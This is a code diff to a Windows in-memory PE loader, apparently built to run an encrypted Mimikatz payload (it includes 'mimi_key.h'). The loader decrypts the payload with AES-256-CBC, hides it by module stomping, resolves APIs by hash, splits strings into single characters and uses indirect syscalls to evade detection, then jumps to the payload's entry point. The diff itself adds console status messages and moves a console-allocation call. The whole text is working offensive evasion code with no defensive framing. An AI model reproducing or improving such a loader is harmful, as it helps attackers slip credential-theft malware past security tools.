@@ -329,11 +329,39 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return 0;
     }
 
+    HANDLE hOut = NULL;
+    typedef BOOL(WINAPI* fn_WRF_M)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
+    fn_WRF_M pWRF = NULL;
+    {
+        typedef BOOL(WINAPI* fn_ATC)(DWORD);
+        fn_ATC pATC = (fn_ATC)GetExpH(hK, 0x1872C9DBu);
+        if (!pATC || !pATC((DWORD)-1)) {
+            typedef BOOL(WINAPI* fn_AC)();
+            fn_AC pAC = (fn_AC)GetExpH(hK, 0x887D7DBDu);
+            if (pAC) pAC();
+        }
+        char s_gsh2[] = {'G','e','t','S','t','d','H','a','n','d','l','e',0};
+        char s_wrf2[] = {'W','r','i','t','e','F','i','l','e',0};
+        typedef HANDLE(WINAPI* fn_GSH2)(DWORD);
+        fn_GSH2 pGSH2 = (fn_GSH2)pGPA(hK, s_gsh2);
+        pWRF = (fn_WRF_M)pGPA(hK, s_wrf2);
+        if (pGSH2) hOut = pGSH2((DWORD)-11);
+    }
+    #define WSTATUS(s) do { if (hOut) { const char _m[] = s; DWORD _w; pWRF(hOut, _m, sizeof(_m)-1, &_w, NULL); } } while(0)
+
+    WSTATUS("[*] Initializing...\r\n");
+
     char* payloadPath = lpCmdLine;
-    while (*payloadPath == ' ' || *payloadPath == '"') payloadPath++;
+    while (*payloadPath == ' ') payloadPath++;
     char cleanPath[260];
     int pi = 0;
-    while (payloadPath[pi] && payloadPath[pi] != '"' && pi < 259) { cleanPath[pi] = payloadPath[pi]; pi++; }
+    BOOL pathQuoted = (*payloadPath == '"');
+    if (pathQuoted) payloadPath++;
+    if (pathQuoted) {
+        while (payloadPath[pi] && payloadPath[pi] != '"' && pi < 259) { cleanPath[pi] = payloadPath[pi]; pi++; }
+    } else {
+        while (payloadPath[pi] && payloadPath[pi] != ' ' && pi < 259) { cleanPath[pi] = payloadPath[pi]; pi++; }
+    }
     cleanPath[pi] = 0;
     char* extraArgs = payloadPath + pi;
     if (*extraArgs == '"') extraArgs++;
@@ -372,8 +400,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
     }
 
+    WSTATUS("[*] Reading encrypted payload...\r\n");
     HANDLE hFile = pCF(cleanPath, 0x80000000, 1, NULL, 3, 0x80, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return 14;
+    if (hFile == INVALID_HANDLE_VALUE) { WSTATUS("[-] File not found\r\n"); return 14; }
     DWORD total = pGFS(hFile, NULL);
     if (total == 0xFFFFFFFF || total < 0x100) { pCH(hFile); return 15; }
 
@@ -397,6 +426,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         total -= skip;
     }
 
+    WSTATUS("[*] Decrypting payload (AES-256-CBC)...\r\n");
     aes_decode_tables();
 
     #include "mimi_key.h"
@@ -412,13 +442,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     total -= 16;
 
     DWORD decLen = aes256cbc_dec((BYTE*)buf, total, aesKey, iv);
-    if (decLen < 0x100) return 18;
+    if (decLen < 0x100) { WSTATUS("[-] Decryption failed\r\n"); return 18; }
 
     PIMAGE_DOS_HEADER dh = (PIMAGE_DOS_HEADER)buf;
-    if (dh->e_magic != 0x5A4D) return 25;
+    if (dh->e_magic != 0x5A4D) { WSTATUS("[-] Invalid PE header\r\n"); return 25; }
     PIMAGE_NT_HEADERS nh = (PIMAGE_NT_HEADERS)((ULONG_PTR)buf + dh->e_lfanew);
     DWORD imgSz = nh->OptionalHeader.SizeOfImage;
 
+    WSTATUS("[*] Module stomping...\r\n");
     LPVOID img;
     {
         char s_cfa[] = {'C','o','p','y','F','i','l','e','A',0};
@@ -458,6 +489,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         if (pDFA) pDFA(dst);
     }
 
+    WSTATUS("[*] Mapping PE sections...\r\n");
     for (DWORD i = 0; i < nh->OptionalHeader.SizeOfHeaders; i++)
         ((BYTE*)img)[i] = ((BYTE*)buf)[i];
 
@@ -471,6 +503,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
     }
 
+    WSTATUS("[*] Fixing relocations...\r\n");
     ULONG_PTR delta = (ULONG_PTR)img - nh->OptionalHeader.ImageBase;
     IMAGE_DATA_DIRECTORY relDir = nh->OptionalHeader.DataDirectory[5];
     if (delta && relDir.VirtualAddress) {
@@ -491,13 +524,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
     }
 
-    {
-        typedef BOOL(WINAPI* fn_AC)();
-        fn_AC pAC = (fn_AC)GetExpH(hK, 0x887D7DBDu);
-        if (pAC) pAC();
-    }
-
-
+    WSTATUS("[*] Resolving imports...\r\n");
     IMAGE_DATA_DIRECTORY impDir = nh->OptionalHeader.DataDirectory[1];
     if (impDir.VirtualAddress) {
         BYTE* id = (BYTE*)img + impDir.VirtualAddress;
@@ -712,6 +739,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         for (DWORD i = 0; i < hdSz; i++) ((BYTE*)img)[i] = 0;
         DoIndirectVP(img, (SIZE_T)hdSz, 0x02, &hdOld, ssnVP, gadget);
 
+        WSTATUS("[+] Executing entry point\r\n");
         ULONG_PTR ep = (ULONG_PTR)img + epRVA;
         ((void(*)())ep)();
     }
